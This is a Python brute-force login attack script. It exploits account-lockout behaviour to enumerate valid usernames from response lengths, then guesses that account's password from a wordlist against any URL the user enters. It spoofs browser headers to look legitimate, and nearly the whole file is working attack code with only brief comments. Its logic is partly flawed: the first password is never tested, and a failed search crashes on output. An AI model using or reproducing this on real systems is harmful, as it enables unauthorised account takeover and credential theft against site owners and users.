'''
Brute Force Attack Script for account lock vulnerability
'''
#import necessary libraries
import requests
import time
#input url to brute force
url = input("Enter the target URL: ").strip()
#read usernames and passwords from files
with open("passwords.txt", "r") as file:
    passwords = [p.strip() for p in file.readlines()]
with open("usernames.txt", "r") as file:
    usernames = [u.strip() for u in file.readlines()]
#headers for the request to look legitimate
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": url + "/login",
    "Origin": url
}
#create a session to persist cookies
session = requests.Session()
#exploiting username enumeration vulnerability
'''
In account lock vulnerability, the application returns error for valid username by locking the account after certain failed attempts.
So we try to find a valid username by giving invalid password multiple times and check for response length.
If the error message length is more than baseline length, we found a valid username.
For invalid usernames, the response length will be consistent.
'''
#function to enumerate usernames
def username_enum():
    time.sleep(1)
    for usr in usernames:
        print(f"Testing usernames: {usr}")
        baseline_length = None
        for attempt in range(5):
            print(f"Attempt: {attempt}")
            data = {
                "username": usr,
                "password": "hehehehehehehe"
            }
            response = session.post(url + "/login",data=data,headers=headers,allow_redirects=False)
            response_length = len(response.text)
            print(f"Response length: {response_length}")
            if baseline_length is None:
                baseline_length = response_length
                continue
            if response_length > baseline_length:
                return usr
    return None
#find valid username and if found, proceed to password guessing or exits the script
valid_username = username_enum()
if not valid_username:
    print("No valid username found")
    exit()
'''
we found a valid username, now we will try to guess the password for that username.
We will use the same response length technique to find the valid password.
the application returns all kinds of responses for invalid passwords, but for valid password, the response length will be minimum.
so we will try all passwords and keep track of minimum response length to find the valid password.
'''
#function to guess password for the valid username found
def password_guess():
    time.sleep(1)
    min_length = None
    valid_password = None
    for pwd in passwords:
        print(f"trying password: {pwd}")
        data = {
            "username": valid_username,
            "password": pwd
        }
        response = session.post(url + "/login",data=data,headers=headers,allow_redirects=False)
        print(f"status code of the request: {response.status_code}")
        response_length = len(response.text)
        print(f"Response length: {response_length}")
        if min_length is None:
                min_length = response_length
                continue
        if response_length <  min_length:
            valid_password = pwd
            min_length = response_length
    return valid_password
#call password guessing function
valid_password = password_guess()
#output the valid credentials found
print("Valid username is: " + valid_username)
print("Valid password is: " + valid_password)
